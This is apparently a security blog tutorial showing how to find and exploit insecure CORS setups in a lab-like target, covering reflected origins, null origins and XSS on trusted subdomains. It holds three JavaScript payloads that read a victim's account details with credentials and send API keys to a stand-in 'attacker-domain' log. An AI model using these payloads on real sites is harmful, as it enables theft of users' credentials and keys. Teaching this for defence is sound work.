---
layout: post
title:  "Detecting and Exploiting Insecure CORS Configuration"
date:   2023-09-25 21:29:20 +0700
categories: jekyll update
usemathjax: true
tag:
  - tips
  - web application
  - CORS
image1:
  - /insecure-cors-configuration/img1.PNG
image2:
  - /insecure-cors-configuration/img2.PNG
image3:
  - /insecure-cors-configuration/img3.PNG
image4:
  - /insecure-cors-configuration/img4.PNG
image5:
  - /insecure-cors-configuration/img5.PNG
image6:
  - /insecure-cors-configuration/img6.PNG
image7:
  - /insecure-cors-configuration/img7.PNG
image8:
  - /insecure-cors-configuration/img8.PNG
image9:
  - /insecure-cors-configuration/img9.PNG
---

Helloo readers!

Some of you might be wondering what CORS is? 🤔

CORS or Cross-Origin Resource Sharing is a security feature implemented by web browsers that controls how web pages in one domain can request and interact with resources (such as data, images, or APIs) hosted on another domain. This security feature is designed to prevent malicious websites from making unauthorized requests to a different domain on behalf of a user.

An insecure CORS configurations may pose significant security risks, including 

1. Data Theft (such as API keys and user credentials).
2. Cross-Site Scripting (XSS) attacks.
3. Remote Code Execution.

Properly configuring CORS policies and server settings is crucial to mitigate these risks and protect web applications and user data.


In this blog, I will demonstrate on how to detect and exploit insecure CORS configurations.

### Reflected Origin

The application becomes susceptible when:

1. Server reconfigures `Access-Control-Allow-Origin` header to the domain supplied by the attacker.
2. `Access-Control-Allow-Credentials` set as true.

<figure>
<img src="{{ page.image1 }}" alt="Reflected Origin">
<figcaption>Fig 1. Reflected Origin</figcaption>
</figure>

To exploit this vulnerability, the attacker must first place the JS script on an external server, making it accessible to the target user. Afterward, they need to craft an HTML page, incorporate the JS script within it, and then deliver this page to the user.

<figure>
<img src="{{ page.image2 }}" alt="Exploit Server">
<figcaption>Fig 2. Exploit Server</figcaption>
</figure>


```javascript
<script>
  # Initialize req and url variable
  var req = new XMLHttpRequest();
  var url = ('URL');

  # Set an event handler for when the request is completed
  req.onload = reqListener;
  # Configure the request
  req.open('GET', url + '/accountDetails',true);
  # Enable sending credentials with the request
  req.withCredentials = true;
  req.send();
  # Define the reqListener function
  function reqListener() {
    location='attacker-domain/log?key='+this.responseText;
  };
</script>
```

After storing and delivering the exploit to the victim, the victim's API Key will pop up in our exploit server log.

<figure>
<img src="{{ page.image3 }}" alt="Result">
<figcaption>Fig 3. Result</figcaption>
</figure>

`alWO6sJJnOlhJYwKVmdMMYhiq6xTLuQ1`

### NULL Origin

The application becomes susceptible when:

1. Server reconfigures `Access-Control-Allow-Origin` header to null.
2. `Access-Control-Allow-Credentials` set as true.

<figure>
<img src="{{ page.image4 }}" alt="NULL">
<figcaption>Fig 4. NULL origin</figcaption>
</figure>

To take advantage of the Null Origin vulnerability, we'll employ an iframe with a sandbox attribute to fetch the API key. 
By utilizing the sandbox property, we establish the frame's origin as null, enabling us to configure the Origin header with a null value.

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    var url = ('URL');

    req.onload = reqListener;
    req.open('GET', url + '/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='attacker-domain/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

After storing and delivering the exploit to the victim, the victim's API Key will pop up in our exploit server log.

<figure>
<img src="{{ page.image5 }}" alt="Result">
<figcaption>Fig 5. Result</figcaption>
</figure>

`noF0gu7NCbYRFg6Cq8lkVbwqLR3574rA`

### Trusted Subdomains

The application becomes susceptible when:

1. Server configures `Access-Control-Allow-Origin` header as trusted subdomains.
2. `Access-Control-Allow-Credentials` set as true.

**This exploitation case is dependent on whether the trusted subdomains have any misconfigurations like Cross-Site Scripting.**

<figure>
<img src="{{ page.image6 }}" alt="NULL">
<figcaption>Fig 6. Trusted Subdomains</figcaption>
</figure>

After finding a CORS misconfiguration, it is time to find for exploitable attack vectors.

In this scenario, we found a reflected XSS vulnerability on the 'Check Stock' feature owned by stock trusted subdomain.

<figure>
<img src="{{ page.image7 }}" alt="NULL">
<figcaption>Fig 7. XSS Payload</figcaption>
</figure>

<figure>
<img src="{{ page.image8 }}" alt="NULL">
<figcaption>Fig 8. XSS</figcaption>
</figure>

Craft a one-liner JavaScript to exfiltrate the apiKey

```javascript
<script>
    document.location="http://stock.VULN.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://VULN.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://attacker-domain/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
````

After storing and delivering the exploit to the victim, the victim's API Key will pop up in our exploit server log.

<figure>
<img src="{{ page.image9 }}" alt="NULL">
<figcaption>Fig 9. Result</figcaption>
</figure>

`Ldrh2myx9LailPFS4i2zzkxw6chGED6F`


### Unexploitable Case: Wild Card

The application is NOT vulnerable when the Access-Control-Allow-Origin is set to wildcard * , even if the Access-Control-Allow-Credentials header is set to true.

This is because there is a safety check in place that disables the Allow-Credentials header when the origin is set to a wildcard.

So that’s it guys, hoped that my blog could help you better understand CORS.

See you on my next blog post!
